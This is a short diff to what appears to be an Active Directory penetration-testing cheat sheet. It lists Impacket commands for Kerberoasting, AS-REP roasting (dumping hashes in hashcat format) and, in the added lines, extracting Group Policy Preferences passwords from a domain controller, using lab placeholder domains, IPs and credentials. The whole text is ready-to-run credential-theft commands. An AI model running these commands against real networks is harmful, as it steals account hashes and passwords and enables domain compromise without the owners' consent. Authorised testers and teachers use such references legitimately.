@@ -24,5 +24,7 @@ python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
 ## ASREP Roasting
 python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
 
+## Get GPPPassword
+python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1
 
 
